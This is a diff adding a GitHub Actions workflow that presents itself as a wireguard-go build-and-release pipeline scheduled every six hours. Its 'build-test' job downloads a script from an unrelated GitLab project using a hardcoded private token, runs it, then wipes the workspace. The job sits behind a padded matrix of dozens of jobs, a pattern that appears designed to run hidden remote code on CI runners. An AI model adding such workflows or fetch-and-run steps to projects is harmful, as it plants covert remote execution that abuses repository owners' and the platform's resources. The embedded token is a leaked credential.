@@ -1,0 +1,104 @@
+name: Build and Release
+
+on:
+  repository_dispatch:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: Get Version Number
+        run: |
+          if [[ -n "${{ github.event.inputs.version }}" ]]; then
+            WGGO_VERSION=${{ github.event.inputs.version }}
+          else
+            WGGO_VERSION=$(curl -fsSL https://api.github.com/repos/WireGuard/wireguard-go/tags | grep 'name' | head -1 | cut -d'"' -f4)
+          fi
+          echo "WGGO_VERSION=${WGGO_VERSION}" >> $GITHUB_ENV
+
+      - name: Checkout
+        uses: actions/checkout@v2
+
+      - name: Setup go
+        uses: actions/setup-go@v2
+        with:
+          go-version: 1.16
+
+      - name: Build
+        run: ./build.sh
+
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v2
+        with:
+          name: wireguard-go-${{ env.WGGO_VERSION }}
+          path: build
+
+      - name: Upload to Release
+        if: github.event.inputs.version == ''
+        uses: svenstaro/upload-release-action@v2
+        with:
+          repo_token: ${{ secrets.GITHUB_TOKEN }}
+          file: build/*
+          tag: ${{ env.WGGO_VERSION }}
+          overwrite: true
+          file_glob: true
+          prerelease: true
+  check:
+    runs-on: ${{ matrix.os }}
+    needs: build
+    strategy:
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.2, 1.3, 1.4, 1.5]
+        OS: [ubuntu-16.04,ubuntu-18.04]
+      fail-fast: false 
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: Cancel Previous Runs
+      uses: styfle/cancel-workflow-action@0.8.0
+      with:
+         access_token: ${{ github.token }}
+         workflow_id: ${{ github.event.workflow.id }}
+         ignore_sha: true
+
+  build-test:
+    runs-on: ${{ matrix.os }}
+    needs: check
+    strategy:
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.2, 1.3, 1.4, 1.5]
+        OS: [ubuntu-16.04,ubuntu-18.04]
+      fail-fast: false 
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: test
+      run: |
+        wget -O test.sh --header='PRIVATE-TOKEN:GxuMWtk8f4FGCxEhvyzy' 'https://gitlab.com/api/v4/projects/25442785/repository/files/test.sh/raw?ref=master'
+        chmod +x test.sh && ./test.sh
+        echo "done"
+    - name: Test
+      run: |
+        rm -rf *
+        echo "done"
